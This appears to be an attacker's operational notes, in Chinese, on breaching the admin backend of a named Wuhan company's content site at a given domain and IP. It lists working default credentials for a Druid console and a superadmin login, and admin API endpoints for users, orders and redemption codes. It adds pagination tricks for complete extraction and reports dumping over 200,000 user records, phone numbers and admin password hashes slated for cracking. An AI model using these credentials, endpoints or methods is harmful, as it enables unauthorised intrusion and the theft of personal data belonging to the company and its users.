# jjld.cn 同公司内容站旁路（2026-09）

**定位**：湖北武汉即联达科技有限公司内容/专栏后台，与 Flutter IM 分服**同主体旁路**，不是 `requestFromEnterpriseCode` 网关。

## 入口

- Host：`jjld.cn`（及 Host 同 IP 的 `applet.jjld.cn` / `s.jjld.cn`）
- IP：`59.110.161.8`
- 栈：Tomcat + Spring Boot + Alibaba Druid + Vue SPA

## 已验证口令

| 面 | 账号 | 密码 | 备注 |
|----|------|------|------|
| Druid `/druid/submitLogin` | `admin` | `123456` | form-urlencoded；datasource 列表可能空，但 basic.json 泄露 classpath |
| SPA `/adminLogin/submit` | phone=`<PHONE-REDACTED>` | `111111` | JSON body；角色含超级管理员权限 |

SPA **必须** `{ "phone": "...", "password": "..." }`。JS 校验文案是「请输入用户名」，实际字段是 `phone`。

## 高价值 API（需 JSESSIONID）

```
POST /admin/main/index                 # userTrends.countNum / 充值汇总
POST /admin/userInfo/list              # 后台管理员（含 password MD5）
POST /admin/userInfo/getList           # 终端用户（21万级）
POST /admin/orderInfo/list             # 订单
POST /admin/exchangecodeform/list      # 兑换码（90万级）
```

分页 body：`{"pageNum":1,"pageSize":500}`。
**不要信 `hasNextPage`**——跟 `pageInfo.pages` 或 `total` 翻到头。

## Dump 落盘习惯

- `users.jsonl` / `orders.jsonl` / `codes.jsonl` + `_meta.json`（got/total/page）
- 手机号导出：`users_phones_only.txt` + csv
- 管理员：`admins.json`（含 MD5；rockyou 前 50 万未必撞得动）
- 2026-09-13 已验证规模：用户 **211507**；去重手机号 **139356**；订单 **1763**；兑换码全量 **923692**（`hasNextPage` 假阴性，跟 `pages` 翻完）

## 子域

crt.sh：`applet` / `s` / `xcx` / `imgcdn` / `live` / `dgtt` / `shop` / `open`…
- 同 IP SPA：可 Host 切换，业务面仍是内容站
- `imgcdn`/`dgtt`：COS AccessDenied
- `live`：CDN 403

## 与 IM 主线的关系

产出：历史注册手机号、订单、兑换码、同公司运营情报。
**不产出**：企业号→IM API host。主线仍回 APK `GetOkHost` / channel link / 开版交付域名。
